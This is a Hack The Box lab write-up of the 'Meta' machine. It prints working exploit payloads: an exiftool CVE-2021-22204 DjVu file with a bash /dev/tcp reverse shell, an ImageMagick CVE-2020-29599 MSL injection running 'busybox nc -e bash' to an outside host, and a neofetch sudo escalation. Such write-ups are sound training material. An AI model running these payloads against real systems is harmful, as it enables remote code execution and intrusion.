---
title: 'HTB-Meta'
published: 2025-09-18
draft: false
toc: true
---
**Start 15:25 27-10-2025**

---
```
Scope:
10.10.11.140
```
# Recon
## Nmap

```bash

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    syn-ack Apache httpd
|_http-title: Did not follow redirect to http://artcorp.htb
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

![](attachments/83941b8653e088fcdc142e0da3d2655e.png)

## 80/TCP - HTTP

![](attachments/5987f5e5cb30217b7e3993d47879790d.png)

![](attachments/01f854a004617668b58a7eb7dfc9c665.png)

This just appears to be a static website with nothing else here:

![](attachments/477ccf4f8d19a5f9e21261a90669c987.png)

### ffuf

Using `ffuf` I found another vhost:

![](attachments/fe1737bd8b7edc217b8b122d4c25d2e9.png)

![](attachments/f11713701170abbfc420b2990ca7bf1e.png)

### dev01.artcorp.htb

![](attachments/21574b661981136c9b041bec2b17d2d1.png)

![](attachments/488da8bf1d70afb61e85ec6d5fb9c49c.png)

I uploaded a sample `png` file:

![](attachments/78c066ca41a8a196645954fc0936ec52.png)

Since the webserver runs on `php` I tried to upload a webshell but got an error:

![](attachments/1a639ddf52afc60c084c148335c867e1.png)

Time to do some manipulation. 

![](attachments/747869a2e094d970d112193540b31d5f.png)

I need to change both of these in order to actually achieve a result.

I instead uploaded `sample.png` first:

![](attachments/d763dfcb57238eb284efe49d3d52153e.png)

And modified it during the intercept:

![](attachments/b7bece5567e43e3d2d4d8a8c5f176fe4.png)

However this still gave an error.

#### gobuster

I went ahead and did a directory enum:

![](attachments/cc57cec8f4b1f2e47364cebb340efa1f.png)

This gave me a hit which also showed the tool that was doing all the work:

![](attachments/8e51fc3edb8c983f35fd3991bd5172cd.png)

It seems that `exiftool` is the one responsible for showing the metadata.
This makes sense as the regular output for `exiftool` looks like this:

![](attachments/daf1b170a327e64ae4d5dec9fe5e4c1f.png)

### exiftool 

I started focussing on finding public exploits and CVE's:

![](attachments/410138bd5ddb93ae3e7355ba93876ef7.png)

It looks like there's 2 of them `CVE-2021-22204` & `CVE-2021-22205`: 

![](attachments/44cf6f234757812da9ccbffbe0d3a75f.png)

# Exploitation
## CVE-2021-22204

![](attachments/264936af704f6aae35751e9d3001ef8a.png)

Let's test it out.

```bash
# On the local machine
sudo apt install djvulibre-bin

# Create payload file with reverse shell
cat > payload
(metadata "\c${system('bash -c \"bash -i >& /dev/tcp/10.10.14.8/443 0>&1\"')};")

# Compress the payload
bzz payload payload.bzz

# Compile the file
djvumake exploit.djvu INFO='1,1' BGjp=/dev/null ANTz=payload.bzz
```

Next up I crafted the config file:

```
%Image::ExifTool::UserDefined = (
Â  Â Â 'Image::ExifTool::Exif::Main' => {
Â  Â  Â  Â  0xc51b => {
Â  Â  Â  Â  Â  Â  Name =>Â 'HasselbladExif',
Â  Â  Â  Â  Â  Â  Writable =>Â 'string',
Â  Â  Â  Â  Â  Â  WriteGroup =>Â 'IFD0',
Â  Â  Â  Â  },
Â  Â  },
);
1;Â #end%
```

Next up I inserted the payload into a random `jpg` file:

```bash
exiftool -config configfile '-HasselbladExif<=exploit.djvu' sample.jpg
```

![](attachments/ff42cf142e3e522d615ab469512cee04.png)

I went ahead and uploaded the image file:

![](attachments/b96ecf03e8f36a6ce78f411ebdc5068e.png)

And checked my listener:

![](attachments/9085c277ef0ecd5f326989357906435e.png)

# Foothold
## Shell as www-data

I started doing some enumeration

![](attachments/3a26532858b7d3d27fd7e9f16217e075.png)

I had no permissions over the `user.txt` flag:

![](attachments/e7e954531872683bb51716d2b958dfd5.png)

Neither could I execute `sudo -l`:

![](attachments/ee5d2116430d3a077ec194a57a44ccad.png)

## Enumeration
### linpeas

I went ahead and uploaded `linpeas.sh` in order to speed up my enum:

![](attachments/e505ac32d60b2973fd2da8768e175491.png)

![](attachments/8e0d09b67ef4b051f1c7e3d34fb2b3b4.png)

![](attachments/2bbeb9039f4759059e0b9d85b6ace3aa.png)

This might be promising.

![](attachments/61f8c1daec61898702c4f8a33cb3831a.png)

### pspy32

However `linpeas` bugged out and wouldn't continue for some reason so I launched `pspy32` to enumerate the running processes:

![](attachments/cd761379cd2e8217f7b9358a32313b55.png)

Here I found the following processes running under the *thomas* user:

![](attachments/e4ecb023eb56173429bf1c0e58eb325f.png)

I checked out the permissions as well as the contents:

![](attachments/f5488c59d43433b0766ddc303b3ea387.png)

I didn't have write permissions unfortunately so I needed to go another way.

## mogrify

![](attachments/4ba66c00aac9544eee8735d830936c42.png)

`mogrify` appears to be a part of the **ImageMagick** toolset.

In order to narrow down the results we can use the following command to find the current version:

![](attachments/e7dbc0111b5a8695f91a111f1c90eec9.png)

After some thorough searching I found the matching CVE:

![](attachments/b88a7b2e71ed3eee6e084e8a7103215b.png)

## CVE-2020-29599

I found a related blogpost:

![](attachments/4ba20a22fcc828816db7160acca24408.png)

The poster goes in full detail of the CVE in [his blog post](https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html):

![](attachments/a8e1aaa30b192281bd251b7244f5fc41.png)

We find the PoC by scrolling down:

![](attachments/60b28d0d36519c8de6e03c1c2243d529.png)

```xml
<image authenticate='ff" `echo $(id)> ./out`;"'>
  <read filename="pdf:/etc/passwd"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">       
  <image xlink:href="msl:poc.svg" height="100" width="100"/>
  </svg>
</image>
```

I then test the command out:

![](attachments/8fb0ef627a24448026ff24d22dc343bc.png)

Since this worked I went ahead and created one with a reverse shell payload:

```xml
<image authenticate='ff" `echo $(busybox nc 10.10.14.8 445 -e bash)> ./out`;"'>
  <read filename="pdf:/etc/passwd"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">       
  <image xlink:href="msl:poc.svg" height="100" width="100"/>
  </svg>
</image>
```

## Shell as thomas

I inserted the above payload and waited for a short while for the shell to trigger:

![](attachments/34d23f3450e3c11cafe834d475332b5b.png)

### user.txt

![](attachments/378a9fb9aa90e9920483cb200c80922b.png)

I went ahead and copied the `id_rsa` afterwards so I could log in via `ssh`:

![](attachments/05191f99af18b84720087870a1087dfc.png)

![](attachments/4a8ee9cbd047811ac6ab7d0dcca21b09.png)

![](attachments/c3c4b8776be6d87681b00f77c9fb48d2.png)

# Privilege Escalation
## neofetch

![](attachments/4b3963e94d48e4826b8813646f3b563e.png)

Unfortunately the `sudoers` rule doesn't allow us to exploit it the GTFObins way:

![](attachments/5d3001776dee6b2971f512f25a97d295.png)

```bash
echo 'exec /bin/sh' > .config/neofetch/config.conf 
XDG_CONFIG_HOME=~/.config sudo neofetch
```

![](attachments/2072a20fcf0071274cb106346e33a397.png)

>[!tldr]
>This works since we're not passing any arguments after the `neofetch` command.

### root.txt

![](attachments/37327ff72602dadc408360351294707c.png)

![](attachments/f9a729ac1dd81822ab85eff403ad67a2.png)

---

**Finished 17:26 27-10-2025**

[^Links]: [[Hack The Box]]

#mogrify #ImageMagick #exiftool #ffuf #CVE-2021-22204 #CVE-2020-29599 #neofetch 
